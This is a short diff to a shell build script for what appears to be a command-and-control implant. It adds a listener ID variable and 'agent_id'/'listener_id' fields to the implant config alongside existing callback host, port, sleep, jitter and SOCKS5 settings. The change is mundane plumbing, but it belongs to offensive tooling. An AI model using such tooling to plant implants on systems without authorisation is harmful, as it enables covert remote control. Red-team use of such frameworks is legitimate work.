@@ -11,6 +11,7 @@ OUTPUT_DIR="" # Primarily set by --output arg or derived
 BUILD_TYPE="release" # Primarily set by --build-type arg
 LISTENER_HOST="" # Primarily set by --listener-host arg
 LISTENER_PORT="" # Primarily set by --listener-port arg
+LISTENER_ID=${LISTENER_ID:-""}
 PAYLOAD_ID="" # Primarily set by --payload-id arg or derived
 PROTOCOL="" # Primarily set by --protocol arg or derived
 
@@ -283,6 +284,8 @@ CONFIG_JSON_CONTENT=$(cat << EOF
     "sleep_interval": ${SLEEP_INTERVAL},
     "jitter": ${JITTER},
     "payload_id": "${PAYLOAD_ID}",
+    "agent_id": "",
+    "listener_id": "${LISTENER_ID}",
     "protocol": "${PROTOCOL}",
     "socks5_enabled": ${SOCKS5_ENABLED},
     "socks5_host": "${SOCKS5_HOST}",
@@ -385,6 +388,7 @@ fi
 # These ensure build.rs gets the final, resolved values.
 export LISTENER_HOST="$LISTENER_HOST" # Actual host/IP for connection
 export LISTENER_PORT="$LISTENER_PORT" # Actual port
+export LISTENER_ID="$LISTENER_ID"
 export SLEEP_INTERVAL="$SLEEP_INTERVAL"
 export PAYLOAD_ID="$PAYLOAD_ID"
 export PROTOCOL="$PROTOCOL" # Actual protocol
